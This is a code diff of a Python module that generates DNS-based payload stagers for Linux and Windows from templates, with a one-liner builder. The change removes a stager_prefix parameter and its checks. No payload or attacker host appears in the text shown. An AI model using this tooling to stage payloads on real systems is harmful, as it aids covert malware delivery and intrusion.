@@ -20,7 +20,6 @@ except NameError:
 _PLACEHOLDERS = (
     '{{BASE_DOMAIN}}',
     '{{CNAME_SUFFIX}}',
-    '{{STAGER_PREFIX}}',
     '{{STAGER_NONCE}}',
     '{{PAYLOAD_HASH}}',
     '{{SFB_ARGS}}',
@@ -199,22 +198,6 @@ def _normalize_stager_nonce(value):
     return value.lower()
 
 
-def _normalize_stager_prefix(value):
-    value = _ensure_ascii_text(value, 'stager_prefix').strip()
-    if not value:
-        raise ValueError('stager_prefix required')
-    value = value.strip('.')
-    if not value:
-        raise ValueError('stager_prefix required')
-    if '.' in value:
-        raise ValueError('stager_prefix must be a single label')
-    if len(value) > 63:
-        raise ValueError('stager_prefix must be <= 63 characters')
-    if _is_base32_label(value):
-        raise ValueError('stager_prefix must include non-base32 characters')
-    return value.lower()
-
-
 def _normalize_payload_hash(value):
     if value is None:
         raise ValueError('payload_hash required')
@@ -309,12 +292,11 @@ def _format_args_list(args):
     return '[' + ', '.join(parts) + ']'
 
 
-def _render_template(template_text, base_domain, cname_suffix, stager_prefix,
-                     stager_nonce, payload_hash, sfb_args, resolver_snippet):
+def _render_template(template_text, base_domain, cname_suffix, stager_nonce,
+                     payload_hash, sfb_args, resolver_snippet):
     rendered = template_text
     rendered = rendered.replace('{{BASE_DOMAIN}}', base_domain)
     rendered = rendered.replace('{{CNAME_SUFFIX}}', cname_suffix)
-    rendered = rendered.replace('{{STAGER_PREFIX}}', stager_prefix)
     rendered = rendered.replace('{{STAGER_NONCE}}', stager_nonce)
     rendered = rendered.replace('{{PAYLOAD_HASH}}', payload_hash)
     rendered = rendered.replace('{{SFB_ARGS}}', sfb_args)
@@ -326,12 +308,10 @@ def _render_template(template_text, base_domain, cname_suffix, stager_prefix,
 
 
 def render_dns_stager(template_path, base_domain, sfb_args, resolver_snippet,
-                      cname_label=None, stager_prefix=None, stager_nonce=None,
-                      payload_hash=None):
+                      cname_label=None, stager_nonce=None, payload_hash=None):
     template_text = _read_ascii(template_path)
     base_domain = _normalize_domain(base_domain)
     cname_suffix = _build_cname_suffix(base_domain, cname_label)
-    stager_prefix = _normalize_stager_prefix(stager_prefix)
     stager_nonce = _normalize_stager_nonce(stager_nonce)
     payload_hash = _normalize_payload_hash(payload_hash)
     sfb_args = _format_args_list(sfb_args or [])
@@ -340,7 +320,6 @@ def render_dns_stager(template_path, base_domain, sfb_args, resolver_snippet,
         template_text,
         base_domain,
         cname_suffix,
-        stager_prefix,
         stager_nonce,
         payload_hash,
         sfb_args,
@@ -377,7 +356,7 @@ def build_one_liner(payload, platform):
 
 def write_dns_stagers(base_domain, sfb_args=None, payload_bytes=None,
                       output_dir=None, template_path=None, cname_label=None,
-                      stager_prefix=None, stager_nonce=None):
+                      stager_nonce=None):
     repo_root = _repo_root()
     if output_dir is None:
         output_dir = repo_root
@@ -396,7 +375,6 @@ def write_dns_stagers(base_domain, sfb_args=None, payload_bytes=None,
         sfb_args,
         LINUX_RESOLVER_SNIPPET,
         cname_label=cname_label,
-        stager_prefix=stager_prefix,
         stager_nonce=stager_nonce,
         payload_hash=payload_hash,
     )
@@ -406,7 +384,6 @@ def write_dns_stagers(base_domain, sfb_args=None, payload_bytes=None,
         sfb_args,
         WINDOWS_RESOLVER_SNIPPET,
         cname_label=cname_label,
-        stager_prefix=stager_prefix,
         stager_nonce=stager_nonce,
         payload_hash=payload_hash,
     )
